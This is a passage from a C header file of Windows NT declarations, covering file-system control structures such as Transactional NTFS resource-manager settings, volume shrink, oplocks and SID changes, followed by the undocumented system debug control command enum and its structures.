} FILE_MAKE_COMPATIBLE_BUFFER, *PFILE_MAKE_COMPATIBLE_BUFFER;


typedef struct _FILE_SET_DEFECT_MGMT_BUFFER {
    BOOLEAN Disable;
} FILE_SET_DEFECT_MGMT_BUFFER, *PFILE_SET_DEFECT_MGMT_BUFFER;


typedef struct _FILE_QUERY_SPARING_BUFFER {
    ULONG SparingUnitBytes;
    BOOLEAN SoftwareSparing;
    ULONG TotalSpareBlocks;
    ULONG FreeSpareBlocks;
} FILE_QUERY_SPARING_BUFFER, *PFILE_QUERY_SPARING_BUFFER;


typedef struct _FILE_QUERY_ON_DISK_VOL_INFO_BUFFER {
    LARGE_INTEGER DirectoryCount;       // -1 = unknown
    LARGE_INTEGER FileCount;            // -1 = unknown
    USHORT FsFormatMajVersion;          // -1 = unknown or n/a
    USHORT FsFormatMinVersion;          // -1 = unknown or n/a
    WCHAR FsFormatName[ 12];
    LARGE_INTEGER FormatTime;
    LARGE_INTEGER LastUpdateTime;
    WCHAR CopyrightInfo[ 34];
    WCHAR AbstractInfo[ 34];
    WCHAR FormattingImplementationInfo[ 34];
    WCHAR LastModifyingImplementationInfo[ 34];
} FILE_QUERY_ON_DISK_VOL_INFO_BUFFER, *PFILE_QUERY_ON_DISK_VOL_INFO_BUFFER;


#define SET_REPAIR_ENABLED                                      (0x00000001)
#define SET_REPAIR_VOLUME_BITMAP_SCAN                           (0x00000002)
#define SET_REPAIR_DELETE_CROSSLINK                             (0x00000004)
#define SET_REPAIR_WARN_ABOUT_DATA_LOSS                         (0x00000008)
#define SET_REPAIR_DISABLED_AND_BUGCHECK_ON_CORRUPT             (0x00000010)
#define SET_REPAIR_VALID_MASK                                   (0x0000001F)

typedef enum _SHRINK_VOLUME_REQUEST_TYPES
{
    ShrinkPrepare = 1,
    ShrinkCommit,
    ShrinkAbort

} SHRINK_VOLUME_REQUEST_TYPES, *PSHRINK_VOLUME_REQUEST_TYPES;

typedef struct _SHRINK_VOLUME_INFORMATION
{
    SHRINK_VOLUME_REQUEST_TYPES ShrinkRequestType;
    ULONGLONG Flags;
    LONGLONG NewNumberOfSectors;

} SHRINK_VOLUME_INFORMATION, *PSHRINK_VOLUME_INFORMATION;

#define TXFS_RM_FLAG_LOGGING_MODE                           0x00000001
#define TXFS_RM_FLAG_RENAME_RM                              0x00000002
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX                0x00000004
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN                0x00000008
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS    0x00000010
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT           0x00000020
#define TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE             0x00000040
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX             0x00000080
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN             0x00000100
#define TXFS_RM_FLAG_GROW_LOG                               0x00000400
#define TXFS_RM_FLAG_SHRINK_LOG                             0x00000800
#define TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                   0x00001000
#define TXFS_RM_FLAG_PRESERVE_CHANGES                       0x00002000
#define TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                 0x00004000
#define TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START          0x00008000
#define TXFS_RM_FLAG_PREFER_CONSISTENCY                     0x00010000
#define TXFS_RM_FLAG_PREFER_AVAILABILITY                    0x00020000

#define TXFS_LOGGING_MODE_SIMPLE        (0x0001)
#define TXFS_LOGGING_MODE_FULL          (0x0002)

#define TXFS_TRANSACTION_STATE_NONE         0x00
#define TXFS_TRANSACTION_STATE_ACTIVE       0x01
#define TXFS_TRANSACTION_STATE_PREPARED     0x02
#define TXFS_TRANSACTION_STATE_NOTACTIVE    0x03

#define TXFS_MODIFY_RM_VALID_FLAGS                                      \
                (TXFS_RM_FLAG_LOGGING_MODE                          |   \
                 TXFS_RM_FLAG_RENAME_RM                             |   \
                 TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX               |   \
                 TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN               |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS   |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT          |   \
                 TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN            |   \
                 TXFS_RM_FLAG_SHRINK_LOG                            |   \
                 TXFS_RM_FLAG_GROW_LOG                              |   \
                 TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                  |   \
                 TXFS_RM_FLAG_PRESERVE_CHANGES                      |   \
                 TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                |   \
                 TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START         |   \
                 TXFS_RM_FLAG_PREFER_CONSISTENCY                    |   \
                 TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_MODIFY_RM {

    //
    //  TXFS_RM_FLAG_* flags
    //

    ULONG Flags;

    //
    //  Maximum log container count if TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX is set.
    //

    ULONG LogContainerCountMax;

    //
    //  Minimum log container count if TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN is set.
    //

    ULONG LogContainerCountMin;

    //
    //  Target log container count for TXFS_RM_FLAG_SHRINK_LOG or _GROW_LOG.
    //

    ULONG LogContainerCount;

    //
    //  When the log is full, increase its size by this much.  Indicated as either a percent of
    //  the log size or absolute container count, depending on which of the TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_*
    //  flags is set.
    //

    ULONG LogGrowthIncrement;

    //
    //  Sets autoshrink policy if TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE is set.  Autoshrink
    //  makes the log shrink so that no more than this percentage of the log is free at any time.
    //

    ULONG LogAutoShrinkPercentage;

    //
    //  Reserved.
    //

    ULONGLONG Reserved;

    //
    //  If TXFS_RM_FLAG_LOGGING_MODE is set, this must contain one of TXFS_LOGGING_MODE_SIMPLE
    //  or TXFS_LOGGING_MODE_FULL.
    //

    USHORT LoggingMode;

} TXFS_MODIFY_RM,
 *PTXFS_MODIFY_RM;

#define TXFS_RM_STATE_NOT_STARTED       0
#define TXFS_RM_STATE_STARTING          1
#define TXFS_RM_STATE_ACTIVE            2
#define TXFS_RM_STATE_SHUTTING_DOWN     3

#define TXFS_QUERY_RM_INFORMATION_VALID_FLAGS                           \
                (TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS   |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT          |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN            |   \
                 TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                |   \
                 TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START         |   \
                 TXFS_RM_FLAG_PREFER_CONSISTENCY                    |   \
                 TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_QUERY_RM_INFORMATION {

	ULONG BytesRequired;
	
	ULONGLONG TailLsn;
	ULONGLONG CurrentLsn;
	ULONGLONG ArchiveTailLsn;
	ULONGLONG LogContainerSize;
	LARGE_INTEGER HighestVirtualClock;
	ULONG LogContainerCount;
	ULONG LogContainerCountMax;
	ULONG LogContainerCountMin;
	ULONG LogGrowthIncrement;
	ULONG LogAutoShrinkPercentage;
	ULONG Flags;

    //
    //  Exactly one of TXFS_LOGGING_MODE_SIMPLE or TXFS_LOGGING_MODE_FULL.
    //

    USHORT LoggingMode;

    //
    //  Reserved.
    //

    USHORT Reserved;

    //
    //  Activity state of the RM.  May be exactly one of the above-defined TXF_RM_STATE_ values.
    //

    ULONG RmState;

    //
    //  Total capacity of the log in bytes.
    //

    ULONGLONG LogCapacity;

    //
    //  Amount of free space in the log in bytes.
    //

    ULONGLONG LogFree;

    //
    //  Size of $Tops in bytes.
    //

    ULONGLONG TopsSize;

    //
    //  Amount of space in $Tops in use.
    //

    ULONGLONG TopsUsed;

    //
    //  Number of transactions active in the RM at the time of the call.
    //

    ULONGLONG TransactionCount;

    //
    //  Total number of single-phase commits that have happened the RM.
    //

    ULONGLONG OnePCCount;

    //
    //  Total number of two-phase commits that have happened the RM.
    //

    ULONGLONG TwoPCCount;

    //
    //  Number of times the log has filled up.
    //

    ULONGLONG NumberLogFileFull;

    //
    //  Age of oldest active transaction in the RM, in milliseconds.
    //

    ULONGLONG OldestTransactionAge;

		GUID RMName;

    ULONG TmLogPathOffset;

} TXFS_QUERY_RM_INFORMATION,
 *PTXFS_QUERY_RM_INFORMATION;

#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN        0x01
#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK   0x02

#define TXFS_ROLLFORWARD_REDO_VALID_FLAGS                               \
                (TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN |         \
                 TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK)

typedef struct _TXFS_ROLLFORWARD_REDO_INFORMATION {
    LARGE_INTEGER  LastVirtualClock;
    ULONGLONG LastRedoLsn;
    ULONGLONG HighestRecoveryLsn;
    ULONG Flags;
} TXFS_ROLLFORWARD_REDO_INFORMATION,
 *PTXFS_ROLLFORWARD_REDO_INFORMATION;

#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX              0x00000001
#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN              0x00000002
#define TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                   0x00000004
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS  0x00000008
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT         0x00000010
#define TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE           0x00000020
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX           0x00000040
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN           0x00000080

#define TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                  0x00000200
#define TXFS_START_RM_FLAG_LOGGING_MODE                         0x00000400
#define TXFS_START_RM_FLAG_PRESERVE_CHANGES                     0x00000800

#define TXFS_START_RM_FLAG_PREFER_CONSISTENCY                   0x00001000
#define TXFS_START_RM_FLAG_PREFER_AVAILABILITY                  0x00002000

#define TXFS_START_RM_VALID_FLAGS                                           \
                (TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                  |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT        |   \
                 TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE          |   \
                 TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                 |   \
                 TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX          |   \
                 TXFS_START_RM_FLAG_LOGGING_MODE                        |   \
                 TXFS_START_RM_FLAG_PRESERVE_CHANGES                    |   \
                 TXFS_START_RM_FLAG_PREFER_CONSISTENCY                  |   \
                 TXFS_START_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_START_RM_INFORMATION {

    //
    //  TXFS_START_RM_FLAG_* flags.
    //

    ULONG Flags;

    //
    //  RM log container size, in bytes.  This parameter is optional.
    //

    ULONGLONG LogContainerSize;

    //
    //  RM minimum log container count.  This parameter is optional.
    //

    ULONG LogContainerCountMin;

    //
    //  RM maximum log container count.  This parameter is optional.
    //

    ULONG LogContainerCountMax;

    //
    //  RM log growth increment in number of containers or percent, as indicated
    //  by TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_* flag.  This parameter is
    //  optional.
    //

    ULONG LogGrowthIncrement;

    //
    //  RM log auto shrink percentage.  This parameter is optional.
    //

    ULONG LogAutoShrinkPercentage;

    //
    //  Offset from the beginning of this structure to the log path for the KTM
    //  instance to be used by this RM.  This must be a two-byte (WCHAR) aligned
    //  value.  This parameter is required.
    //

    ULONG TmLogPathOffset;

    //
    //  Length in bytes of log path for the KTM instance to be used by this RM.
    //  This parameter is required.
    //

    USHORT TmLogPathLength;

    //
    //  Logging mode for this RM.  One of TXFS_LOGGING_MODE_SIMPLE or
    //  TXFS_LOGGING_MODE_FULL (mutually exclusive).  This parameter is optional,
    //  and will default to TXFS_LOGGING_MODE_SIMPLE.
    //

    USHORT LoggingMode;

    //
    //  Length in bytes of the path to the log to be used by the RM.  This parameter
    //  is required.
    //

    USHORT LogPathLength;

    //
    //  Reserved.
    //

    USHORT Reserved;

    //
    //  The path to the log (in Unicode characters) to be used by the RM goes here.
    //  This parameter is required.
    //

    WCHAR LogPath[1];

} TXFS_START_RM_INFORMATION,
 *PTXFS_START_RM_INFORMATION;

//
//  Structures for FSCTL_TXFS_GET_METADATA_INFO
//

typedef struct _TXFS_GET_METADATA_INFO_OUT {

    //
    //  Returns the TxfId of the file referenced by the handle used to call this routine.
    //

    struct {
        LONGLONG LowPart;
        LONGLONG HighPart;
    } TxfFileId;

    //
    //  The GUID of the transaction that has the file locked, if applicable.
    //

    GUID LockingTransaction;

    //
    //  Returns the LSN for the most recent log record we've written for the file.
    //

    ULONGLONG LastLsn;

    //
    //  Transaction state, a TXFS_TRANSACTION_STATE_* value.
    //

    ULONG TransactionState;

} TXFS_GET_METADATA_INFO_OUT, *PTXFS_GET_METADATA_INFO_OUT;

#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_CREATED   0x00000001
#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_DELETED   0x00000002

typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY {

    //
    //  Offset in bytes from the beginning of the TXFS_LIST_TRANSACTION_LOCKED_FILES
    //  structure to the next TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY.
    //

    ULONGLONG Offset;

    //
    //  TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_* flags to indicate whether the
    //  current name was deleted or created in the transaction.
    //

    ULONG NameFlags;

    //
    //  NTFS File ID of the file.
    //

    LONGLONG FileId;

    //
    //  Reserved.
    //

    ULONG Reserved1;
    ULONG Reserved2;
    LONGLONG Reserved3;

    //
    //  NULL-terminated Unicode path to this file, relative to RM root.
    //

    WCHAR FileName[1];
} TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY, *PTXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY;


typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES {

    //
    //  GUID name of the KTM transaction that files should be enumerated from.
    //

    GUID KtmTransaction;

    //
    //  On output, the number of files involved in the transaction on this RM.
    //

    ULONGLONG NumberOfFiles;

    //
    //  The length of the buffer required to obtain the complete list of files.
    //  This value may change from call to call as the transaction locks more files.
    //

    ULONGLONG BufferSizeRequired;

    //
    //  Offset in bytes from the beginning of this structure to the first
    //  TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY.
    //

    ULONGLONG Offset;
} TXFS_LIST_TRANSACTION_LOCKED_FILES, *PTXFS_LIST_TRANSACTION_LOCKED_FILES;

//
//  Structures for FSCTL_TXFS_LIST_TRANSACTIONS
//

typedef struct _TXFS_LIST_TRANSACTIONS_ENTRY {

    //
    //  Transaction GUID.
    //

    GUID TransactionId;

    //
    //  Transaction state, a TXFS_TRANSACTION_STATE_* value.
    //

    ULONG TransactionState;

    //
    //  Reserved fields
    //

    ULONG Reserved1;
    ULONG Reserved2;
    LONGLONG Reserved3;
} TXFS_LIST_TRANSACTIONS_ENTRY, *PTXFS_LIST_TRANSACTIONS_ENTRY;

typedef struct _TXFS_LIST_TRANSACTIONS {

    //
    //  On output, the number of transactions involved in this RM.
    //

    ULONGLONG NumberOfTransactions;

    //
    //  The length of the buffer required to obtain the complete list of
    //  transactions.  Note that this value may change from call to call
    //  as transactions enter and exit the system.
    //

    ULONGLONG BufferSizeRequired;
} TXFS_LIST_TRANSACTIONS, *PTXFS_LIST_TRANSACTIONS;


#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _TXFS_READ_BACKUP_INFORMATION_OUT {
    union {

        //
        //  Used to return the required buffer size if return code is STATUS_BUFFER_OVERFLOW
        //

        ULONG BufferLength;

        //
        //  On success the data is copied here.
        //

        UCHAR Buffer[1];
    } DUMMYUNIONNAME;
} TXFS_READ_BACKUP_INFORMATION_OUT, *PTXFS_READ_BACKUP_INFORMATION_OUT;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 )
#endif

typedef struct _TXFS_WRITE_BACKUP_INFORMATION {
    UCHAR Buffer[1];
} TXFS_WRITE_BACKUP_INFORMATION, *PTXFS_WRITE_BACKUP_INFORMATION;

#define TXFS_TRANSACTED_VERSION_NONTRANSACTED   0xFFFFFFFE
#define TXFS_TRANSACTED_VERSION_UNCOMMITTED     0xFFFFFFFF

typedef struct _TXFS_GET_TRANSACTED_VERSION {

    //
    //  The version that this handle is opened to.  This will be
    //  TXFS_TRANSACTED_VERSION_UNCOMMITTED for nontransacted and
    //  transactional writer handles.
    //

    ULONG ThisBaseVersion;

    //
    //  The most recent committed version available.
    //

    ULONG LatestVersion;

    //
    //  If this is a handle to a miniversion, the ID of the miniversion.
    //  If it is not a handle to a minivers, this field will be 0.
    //

    USHORT ThisMiniVersion;

    //
    //  The first available miniversion.  Unless the miniversions are
    //  visible to the transaction bound to this handle, this field will be zero.
    //

    USHORT FirstMiniVersion;

    //
    //  The latest available miniversion.  Unless the miniversions are
    //  visible to the transaction bound to this handle, this field will be zero.
    //

    USHORT LatestMiniVersion;

} TXFS_GET_TRANSACTED_VERSION, *PTXFS_GET_TRANSACTED_VERSION;


#define TXFS_SAVEPOINT_SET                      0x00000001

//
//  Roll back to a specified savepoint.
//

#define TXFS_SAVEPOINT_ROLLBACK                 0x00000002

//
//  Clear (make unavailable for rollback) the most recently set savepoint
//  that has not yet been cleared.
//

#define TXFS_SAVEPOINT_CLEAR                    0x00000004

//
//  Clear all savepoints from the transaction.
//

#define TXFS_SAVEPOINT_CLEAR_ALL                0x00000010

typedef struct _TXFS_SAVEPOINT_INFORMATION {
    HANDLE KtmTransaction;
    ULONG ActionCode;
    ULONG SavepointId;
} TXFS_SAVEPOINT_INFORMATION, *PTXFS_SAVEPOINT_INFORMATION;


typedef struct _TXFS_CREATE_MINIVERSION_INFO {

    USHORT StructureVersion;
    USHORT StructureLength;
    ULONG BaseVersion;
    USHORT MiniVersion;
} TXFS_CREATE_MINIVERSION_INFO, *PTXFS_CREATE_MINIVERSION_INFO;


typedef struct _TXFS_TRANSACTION_ACTIVE_INFO {
	BOOLEAN TransactionsActiveAtSnapshot;

} TXFS_TRANSACTION_ACTIVE_INFO, *PTXFS_TRANSACTION_ACTIVE_INFO;

#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)

typedef struct _BOOT_AREA_INFO {

    ULONG               BootSectorCount;  // the count of boot sectors present on the file system
    struct {
        LARGE_INTEGER   Offset;
    } BootSectors[2];                     // variable number of boot sectors.

} BOOT_AREA_INFO, *PBOOT_AREA_INFO;

typedef struct _RETRIEVAL_POINTER_BASE {

    LARGE_INTEGER       FileAreaOffset; // sector offset to the first allocatable unit on the filesystem
} RETRIEVAL_POINTER_BASE, *PRETRIEVAL_POINTER_BASE;

typedef struct _FILE_FS_PERSISTENT_VOLUME_INFORMATION {

    ULONG VolumeFlags;
    ULONG FlagMask;
    ULONG Version;
    ULONG Reserved;

} FILE_FS_PERSISTENT_VOLUME_INFORMATION, *PFILE_FS_PERSISTENT_VOLUME_INFORMATION;

typedef struct _FILE_SYSTEM_RECOGNITION_INFORMATION {

    CHAR FileSystem[9];

} FILE_SYSTEM_RECOGNITION_INFORMATION, *PFILE_SYSTEM_RECOGNITION_INFORMATION;

#define OPLOCK_LEVEL_CACHE_READ         (0x00000001)
#define OPLOCK_LEVEL_CACHE_HANDLE       (0x00000002)
#define OPLOCK_LEVEL_CACHE_WRITE        (0x00000004)

#define REQUEST_OPLOCK_INPUT_FLAG_REQUEST               (0x00000001)
#define REQUEST_OPLOCK_INPUT_FLAG_ACK                   (0x00000002)
#define REQUEST_OPLOCK_INPUT_FLAG_COMPLETE_ACK_ON_CLOSE (0x00000004)

#define REQUEST_OPLOCK_CURRENT_VERSION          1

typedef struct _REQUEST_OPLOCK_INPUT_BUFFER {

    //
    //  This should be set to REQUEST_OPLOCK_CURRENT_VERSION.
    //

    USHORT StructureVersion;

    USHORT StructureLength;

    //
    //  One or more OPLOCK_LEVEL_CACHE_* values to indicate the desired level of the oplock.
    //

    ULONG RequestedOplockLevel;

    //
    //  REQUEST_OPLOCK_INPUT_FLAG_* flags.
    //

    ULONG Flags;

} REQUEST_OPLOCK_INPUT_BUFFER, *PREQUEST_OPLOCK_INPUT_BUFFER;

#define REQUEST_OPLOCK_OUTPUT_FLAG_ACK_REQUIRED     (0x00000001)
#define REQUEST_OPLOCK_OUTPUT_FLAG_MODES_PROVIDED   (0x00000002)

typedef struct _REQUEST_OPLOCK_OUTPUT_BUFFER {

    USHORT StructureVersion;

    USHORT StructureLength;

    ULONG OriginalOplockLevel;

    ULONG NewOplockLevel;

    ULONG Flags;

    ACCESS_MASK AccessMode;

    USHORT ShareMode;

} REQUEST_OPLOCK_OUTPUT_BUFFER, *PREQUEST_OPLOCK_OUTPUT_BUFFER;


#define SD_GLOBAL_CHANGE_TYPE_MACHINE_SID   1

typedef struct _SD_CHANGE_MACHINE_SID_INPUT {

    USHORT CurrentMachineSIDOffset;
    USHORT CurrentMachineSIDLength;

    USHORT NewMachineSIDOffset;
    USHORT NewMachineSIDLength;

} SD_CHANGE_MACHINE_SID_INPUT, *PSD_CHANGE_MACHINE_SID_INPUT;

typedef struct _SD_CHANGE_MACHINE_SID_OUTPUT {

    //
    //  How many entries were successfully changed in the $Secure stream
    //

    ULONGLONG NumSDChangedSuccess;

    //
    //  How many entires failed the update in the $Secure stream
    //

    ULONGLONG NumSDChangedFail;

    //
    //  How many entires are unused in the current security stream
    //

    ULONGLONG NumSDUnused;

    //
    //  The total number of entries processed in the $Secure stream
    //

    ULONGLONG NumSDTotal;

    //
    //  How many entries were successfully changed in the $MFT file
    //

    ULONGLONG NumMftSDChangedSuccess;

    //
    //  How many entries failed the update in the $MFT file
    //

    ULONGLONG NumMftSDChangedFail;

    //
    //  Total number of entriess process in the $MFT file
    //

    ULONGLONG NumMftSDTotal;

} SD_CHANGE_MACHINE_SID_OUTPUT, *PSD_CHANGE_MACHINE_SID_OUTPUT;

//
//  Generic INPUT & OUTPUT structures for FSCTL_SD_GLOBAL_CHANGE
//

#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _SD_GLOBAL_CHANGE_INPUT
{
    //
    //  Input flags (none currently defined)
    //

    ULONG Flags;

    //
    //  Specifies which type of change we are doing and pics which member
    //  of the below union is in use.
    //

    ULONG ChangeType;

    union {

        SD_CHANGE_MACHINE_SID_INPUT SdChange;
    };

} SD_GLOBAL_CHANGE_INPUT, *PSD_GLOBAL_CHANGE_INPUT;

typedef struct _SD_GLOBAL_CHANGE_OUTPUT
{

    //
    //  Output State Flags (none currently defined)
    //

    ULONG Flags;

    //
    //  Specifies which below union to use
    //

    ULONG ChangeType;

    union {

        SD_CHANGE_MACHINE_SID_OUTPUT SdChange;
    };

} SD_GLOBAL_CHANGE_OUTPUT, *PSD_GLOBAL_CHANGE_OUTPUT;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 ) /* nonstandard extension used : nameless struct/union */
#endif

//
//  Flag to indicate the encrypted file is sparse
//

#define ENCRYPTED_DATA_INFO_SPARSE_FILE    1

typedef struct _EXTENDED_ENCRYPTED_DATA_INFO {

    ULONG ExtendedCode;
    ULONG Length;
    ULONG Flags;
    ULONG Reserved;

} EXTENDED_ENCRYPTED_DATA_INFO, *PEXTENDED_ENCRYPTED_DATA_INFO;


typedef struct _LOOKUP_STREAM_FROM_CLUSTER_INPUT {
    ULONG         Flags;
    ULONG         NumberOfClusters;
    LARGE_INTEGER Cluster[1];
} LOOKUP_STREAM_FROM_CLUSTER_INPUT, *PLOOKUP_STREAM_FROM_CLUSTER_INPUT;

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_OUTPUT {
    ULONG         Offset;
    ULONG         NumberOfMatches;
    ULONG         BufferSizeRequired;
} LOOKUP_STREAM_FROM_CLUSTER_OUTPUT, *PLOOKUP_STREAM_FROM_CLUSTER_OUTPUT;

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_PAGE_FILE          0x00000001
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_DENY_DEFRAG_SET    0x00000002
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_FS_SYSTEM_FILE     0x00000004
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_TXF_SYSTEM_FILE    0x00000008

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_MASK          0xff000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_DATA          0x01000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_INDEX         0x02000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_SYSTEM        0x03000000

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_ENTRY {
    ULONG         OffsetToNext;
    ULONG         Flags;
    LARGE_INTEGER Reserved;
    LARGE_INTEGER Cluster;
    WCHAR         FileName[1];
} LOOKUP_STREAM_FROM_CLUSTER_ENTRY, *PLOOKUP_STREAM_FROM_CLUSTER_ENTRY;

typedef struct _FILE_TYPE_NOTIFICATION_INPUT {

    ULONG Flags;
    ULONG NumFileTypeIDs;
    GUID FileTypeID[1];

} FILE_TYPE_NOTIFICATION_INPUT, *PFILE_TYPE_NOTIFICATION_INPUT;

#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_BEGIN     0x00000001      //Set when adding the specified usage on the given file
#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_END       0x00000002      //Set when removing the specified usage on the given file

DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_PAGE_FILE,         0x0d0a64a1, 0x38fc, 0x4db8, 0x9f, 0xe7, 0x3f, 0x43, 0x52, 0xcd, 0x7c, 0x5c );
DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_HIBERNATION_FILE,  0xb7624d64, 0xb9a3, 0x4cf8, 0x80, 0x11, 0x5b, 0x86, 0xc9, 0x40, 0xe7, 0xb7 );
DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_CRASHDUMP_FILE,    0x9d453eb7, 0xd2a6, 0x4dbd, 0xa2, 0xe3, 0xfb, 0xd0, 0xed, 0x91, 0x09, 0xa9 );
#endif /* _WIN32_WINNT >= 0x0601 */

#endif // _FILESYSTEMFSCTL_

// 21.12.2011 - end

// 09.06.2011 - end

typedef enum _SYSDBG_COMMAND
{
	SysDbgQueryModuleInformation,
	SysDbgQueryTraceInformation,
	SysDbgSetTracepoint,
	SysDbgSetSpecialCall,
	SysDbgClearSpecialCalls,
	SysDbgQuerySpecialCalls,
	SysDbgBreakPoint,
	SysDbgQueryVersion,
	SysDbgReadVirtual,
	SysDbgWriteVirtual,
	SysDbgReadPhysical,
	SysDbgWritePhysical,
	SysDbgReadControlSpace,
	SysDbgWriteControlSpace,
	SysDbgReadIoSpace,
	SysDbgWriteIoSpace,
	SysDbgReadMsr,
	SysDbgWriteMsr,
	SysDbgReadBusData,
	SysDbgWriteBusData,
	SysDbgCheckLowMemory,
	SysDbgEnableKernelDebugger,
	SysDbgDisableKernelDebugger,
	SysDbgGetAutoKdEnable,
	SysDbgSetAutoKdEnable,
	SysDbgGetPrintBufferSize,
	SysDbgSetPrintBufferSize,
	SysDbgGetKdUmExceptionEnable,
	SysDbgSetKdUmExceptionEnable,
	SysDbgGetTriageDump,
	SysDbgGetKdBlockEnable,
	SysDbgSetKdBlockEnable,
	SysDbgRegisterForUmBreakInfo,
	SysDbgGetUmBreakPid,
	SysDbgClearUmBreakPid,
	SysDbgGetUmAttachPid,
	SysDbgClearUmAttachPid
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL
{
	PVOID Address;
	PVOID Buffer;
	ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

typedef struct _SYSDBG_PHYSICAL
{
	PHYSICAL_ADDRESS Address;
	PVOID Buffer;
	ULONG Request;
} SYSDBG_PHYSICAL, *PSYSDBG_PHYSICAL;

typedef struct _SYSDBG_CONTROL_SPACE
{
	ULONG64 Address;
	PVOID Buffer;
	ULONG Request;
	ULONG Processor;
} SYSDBG_CONTROL_SPACE, *PSYSDBG_CONTROL_SPACE;

typedef enum _INTERFACE_TYPE
{
	UnknownInterfaceType = 1
